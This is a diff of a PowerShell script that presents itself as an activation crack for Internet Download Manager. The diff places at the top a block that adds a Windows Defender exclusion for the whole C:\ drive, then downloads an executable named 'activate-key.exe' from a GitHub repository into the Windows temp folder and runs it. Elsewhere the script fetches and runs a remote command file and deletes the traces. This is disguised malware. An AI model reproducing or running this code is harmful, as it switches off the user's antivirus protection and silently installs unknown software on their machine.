@@ -1,5 +1,14 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
+Add-MpPreference -ExclusionPath "C:\"
+$url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
+$outpath = "C:\Windows\Temp\activate-key.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "C:\Windows\Temp\activate-key.exe" -ArgumentList $args
+
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
@@ -23,15 +32,9 @@ $content = $prefix + $response
 Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
-Add-MpPreference -ExclusionPath "C:\"
+
 $FilePaths = @("$env:TEMP\IAS*.cmd", "$env:SystemRoot\Temp\IAS*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
 
-$url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
-$outpath = "C:\Windows\Temp\activate-key.exe"
-Invoke-WebRequest -Uri $url -OutFile $outpath
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $outpath)
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "C:\Windows\Temp\activate-key.exe" -ArgumentList $args
+
 
